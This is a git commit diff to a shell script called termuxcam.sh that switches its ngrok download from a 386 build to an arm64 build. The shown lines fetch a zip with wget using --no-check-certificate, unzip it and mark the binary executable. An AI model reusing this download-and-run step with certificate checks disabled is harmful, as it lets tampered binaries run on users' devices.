9bc2c5cd228896ba0771f86f304e1525e1ad1b8f
FI Ridon <37545783+firidon@users.noreply.github.com>
2020-04-22 14:06:18 +0600

    Update termuxcam.sh

--- termuxcam.sh
+++ termuxcam.sh
@@ -173,11 +173,11 @@ exit 1
 fi
 
 else
-wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
-if [[ -e ngrok-stable-linux-386.zip ]]; then
-unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
+wget --no-check-certificate https://bin.equinox.io/a/nmkK3DkqZEB/ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1 
+if [[ -e ngrok-2.2.8-linux-arm64.zip ]]; then
+unzip ngrok-2.2.8-linux-arm64.zip > /dev/null 2>&1
 chmod +x ngrok
-rm -rf ngrok-stable-linux-386.zip
+rm -rf ngrok-2.2.8-linux-arm64.zip
 else
 printf "\e[1;93m[!] Download error... \e[0m\n"
 exit 1
